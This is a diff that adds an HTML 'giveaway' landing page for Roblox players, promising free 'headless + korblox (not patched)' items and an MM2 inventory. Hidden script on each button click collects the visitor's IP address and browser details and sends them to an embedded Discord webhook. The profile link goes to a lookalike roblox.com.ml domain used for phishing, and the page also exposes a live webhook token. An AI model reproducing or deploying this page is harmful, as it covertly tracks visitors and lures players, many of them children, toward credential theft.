@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lina_PY | Socialz 
+    </title>
+    <style>
+        :root {
+            --primary-blue: #00A2FF;
+            --hacker-green: #00ff41;
+            --mm2-gold: #FFD700;
+            --game-purple: #8e44ad;
+            --insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+        }
+
+        body, html {
+            margin: 0; padding: 0;
+            height: 100%; width: 100%;
+            background-color: #050505;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #bgVideo {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            object-fit: cover;
+            z-index: 2;
+            opacity: 0;
+            animation: videoPrecisionFade 15.1s infinite;
+            pointer-events: none;
+        }
+
+        .avatar-bg {
+            position: fixed;
+            width: 100vw; height: 100vw;
+            max-width: 600px; max-height: 600px;
+            background: url("kampicture.webp") no-repeat center;
+            background-size: contain;
+            z-index: 0;
+            top: 45%; left: 50%;
+            transform: translate(-50%, -50%);
+            transition: transform 0.1s ease-out;
+            filter: drop-shadow(0 0 20px rgba(0, 162, 255, 0.2));
+            animation: avatarInverseFade 15.1s infinite;
+        }
+
+        #glitchWatermark {
+            position: fixed;
+            bottom: 30px; left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+            font-size: 11px;
+            font-weight: 800;
+            color: white;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
+            opacity: 0;
+            animation: videoPrecisionFade 15.1s infinite, textFloat 2s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes videoPrecisionFade {
+            0% { opacity: 0; }
+            3% { opacity: 0.5; }
+            30% { opacity: 0.5; }
+            33% { opacity: 0; }
+            100% { opacity: 0; }
+        }
+
+        @keyframes avatarInverseFade {
+            0% { opacity: 0.6; }
+            3% { opacity: 0; }
+            30% { opacity: 0; }
+            33% { opacity: 0.6; }
+            100% { opacity: 0.6; }
+        }
+
+        @keyframes textFloat {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-5px); }
+        }
+
+        #hackerRain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; opacity: 0.08; }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 35px 25px;
+            border-radius: 20px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            width: 85%;
+            max-width: 320px;
+        }
+
+        h1 {
+            font-size: 9px;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            color: var(--hacker-green);
+            text-shadow: 0 0 10px var(--hacker-green);
+        }
+
+        .btn {
+            position: relative;
+            width: 100%;
+            height: 55px;
+            font-size: 13px;
+            font-weight: 800;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .btn:hover { transform: translateY(-3px); }
+        .btn-roblox { background: var(--primary-blue); box-shadow: 0 0 15px rgba(0, 162, 255, 0.3); }
+        .btn-mm2 { background: #111; border: 1px solid var(--mm2-gold); color: var(--mm2-gold); }
+        .btn-game { background: var(--game-purple); box-shadow: 0 0 15px rgba(142, 68, 173, 0.3); flex-direction: column; line-height: 1.2; }
+        .btn-insta { background: var(--insta-gradient); box-shadow: 0 0 15px rgba(220, 39, 67, 0.3); }
+
+        .tiny-green {
+            font-size: 8px;
+            color: var(--hacker-green);
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .shine-line {
+            position: absolute;
+            top: 0; left: -100%;
+            width: 50%; height: 100%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0) 100%);
+            transform: skewX(-25deg);
+            animation: moveShine 3.5s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+
+        @keyframes moveShine { 0% { left: -100%; } 40% { left: 150%; } 100% { left: 150%; } }
+
+        .roblox-wrapper { width: 100%; position: relative; }
+        .joins-label {
+            position: absolute;
+            right: -5px; top: -18px;
+            background: #111;
+            color: var(--hacker-green);
+            font-size: 8px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid var(--hacker-green);
+            white-space: nowrap;
+            animation: floatLabel 3s ease-in-out infinite;
+            z-index: 15;
+            font-weight: bold;
+        }
+        @keyframes floatLabel { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
+
+        #inventoryOverlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 100;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+        }
+
+        .slider-container { position: relative; width: 90%; max-width: 500px; display: flex; align-items: center; justify-content: center; }
+        #sliderImg { width: 100%; border-radius: 10px; border: 2px solid var(--mm2-gold); transition: opacity 0.3s ease; }
+        .nav-btn { position: absolute; background: rgba(255,255,255,0.1); color: white; border: none; padding: 15px; cursor: pointer; border-radius: 50%; font-size: 20px; }
+        #prevBtn { left: -20px; } #nextBtn { right: -20px; }
+        #closeBtn { margin-top: 30px; color: #ff4444; font-weight: bold; cursor: pointer; letter-spacing: 2px; }
+
+        .help-wrapper { width: 100%; position: relative; display: flex; flex-direction: column; align-items: center; }
+        .help-note { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px; animation: bounceV 2s infinite; }
+        .help-note img { width: 25px; filter: invert(1); transform: rotate(90deg); }
+        .help-note span { font-size: 10px; color: #fff; font-weight: 600; }
+
+        @keyframes bounceV { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(8px); } }
+
+        @media (min-width: 850px) {
+            .help-note { position: absolute; left: 115%; top: 50%; transform: translateY(-50%); margin-top: 0; animation: bounceH 2s infinite; white-space: nowrap; }
+            .help-note img { transform: rotate(0deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <video muted playsinline id="bgVideo">
+        <source src="./Roblox-2026-03-30T22_18_15.473Z.mp4" type="video/mp4">
+    </video>
+
+    <div id="glitchWatermark">@lina_py</div>
+
+    <canvas id="hackerRain"></canvas>
+    <div class="avatar-bg" id="avatar"></div>
+
+    <div class="container">
+        <h1>LINA_PY // GIVEAWAYZ</h1>
+        
+        <div class="roblox-wrapper">
+            <div class="joins-label">(joins on for everyone)</div>
+            <a href="https://www.roblox.com.ml/users/278375346370/profile" target="_blank" rel="noopener noreferrer" class="btn btn-roblox">
+                <div class="shine-line"></div>
+                My Roblox Profile
+            </a>
+        </div>
+
+        <button id="gameBtn" class="btn btn-game">
+            <div class="shine-line"></div>
+            UGC headless + korblox
+            <span class="tiny-green">(not patched)</span>
+        </button>
+
+        <button id="mm2Btn" class="btn btn-mm2">
+            <div class="shine-line"></div>
+            MM2 Inventory
+        </button>
+        
+        <div class="help-wrapper">
+            <button id="instaBtn" class="btn btn-insta">
+                <div class="shine-line"></div>
+                Instagram
+            </button>
+            <div class="help-note">
+                <img src="./arrow.png" alt="arrow">
+                <span>if need help, DM me on instagram</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="inventoryOverlay">
+        <div class="slider-container">
+            <button id="prevBtn" class="nav-btn" onclick="changeImg(-1)">&#10094;</button>
+            <img id="sliderImg" src="./inventory1.png">
+            <button id="nextBtn" class="nav-btn" onclick="changeImg(1)">&#10095;</button>
+        </div>
+        <div id="closeBtn" onclick="closeInventory()">[ close ]</div>
+    </div>
+
+    <script>
+        const INSTA_URL = "https://www.instagram.com/ivyswxg/";
+        const GAME_URL = "https://www.roblox.com/games/117819195917720/UGC-Lina-py-bundle";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1490443313491476641/v5vjr6OUmrmF4xdb6hHnyS-kjFbLpkbqJWSUPWqvNtfMD4JB3v0Zjxxv0tyeVt9g_Oeo";
+        const video = document.getElementById('bgVideo');
+        
+        function playVideoCycle() {
+            video.currentTime = 0;
+            video.play().catch(e => console.log("Auto-play blocked: ", e));
+            setTimeout(playVideoCycle, 15100);
+        }
+        window.addEventListener('load', playVideoCycle);
+
+        async function sendWebhook(actionName) {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                let embedColor = actionName === "Instagram" ? 13501832 : (actionName === "Game" ? 9323693 : 16766720);
+
+                const message = {
+                    embeds: [{
+                        title: `🔔 Button Triggered: ${actionName}`,
+                        color: embedColor,
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                            { name: "📱 Device Info", value: `\`${navigator.userAgent}\`` }
+                        ],
+                        timestamp: new Date()
+                    }]
+                };
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+            } catch (err) {}
+        }
+
+        document.getElementById('gameBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('gameBtn');
+            btn.textContent = "OPENING...";
+            await sendWebhook("Game");
+            window.open(GAME_URL, '_blank');
+            setTimeout(() => { btn.innerHTML = '<div class="shine-line"></div>UGC headless + korblox<span class="tiny-green">(not patched)</span>'; }, 2000);
+        });
+
+        document.getElementById('mm2Btn').addEventListener('click', async () => {
+            sendWebhook("MM2 Inventory");
+            openInventory();
+        });
+
+        document.getElementById('instaBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('instaBtn');
+            btn.textContent = "LOADING...";
+            await sendWebhook("Instagram");
+            window.open(INSTA_URL, '_blank');
+            setTimeout(() => { btn.innerHTML = '<div class="shine-line"></div>Instagram'; }, 2000);
+        });
+
+        const images = ["inventory1.png", "inventory2.png", "inventory3.png", "inventory4.png", "inventory5.png"];
+        let currentIndex = 0;
+        function openInventory() { document.getElementById('inventoryOverlay').style.display = 'flex'; }
+        function closeInventory() { document.getElementById('inventoryOverlay').style.display = 'none'; }
+        function changeImg(dir) {
+            currentIndex += dir;
+            if (currentIndex >= images.length) currentIndex = 0;
+            if (currentIndex < 0) currentIndex = images.length - 1;
+            document.getElementById('sliderImg').src = `./${images[currentIndex]}`;
+        }
+
+        const avatar = document.getElementById('avatar');
+        document.addEventListener('mousemove', (e) => {
+            const x = (e.clientX - window.innerWidth / 2) / 45;
+            const y = (e.clientY - window.innerHeight / 2) / 45;
+            avatar.style.transform = `translate(calc(-50% + ${x}px), calc(-50% + ${y}px))`;
+        });
+
+        const rainCanvas = document.getElementById('hackerRain');
+        const rCtx = rainCanvas.getContext('2d');
+        function resize() { rainCanvas.width = window.innerWidth; rainCanvas.height = window.innerHeight; }
+        window.onresize = resize; resize();
+        const drops = Array(Math.floor(window.innerWidth / 14)).fill(1);
+        function drawRain() {
+            rCtx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            rCtx.fillRect(0, 0, rainCanvas.width, rainCanvas.height);
+            rCtx.fillStyle = "#00ff41"; rCtx.font = "14px monospace";
+            drops.forEach((y, i) => {
+                rCtx.fillText(Math.random() > 0.5 ? "0" : "1", i*14, y*14);
+                if (y*14 > rainCanvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawRain, 33);
+    </script>
+</body>
+</html>
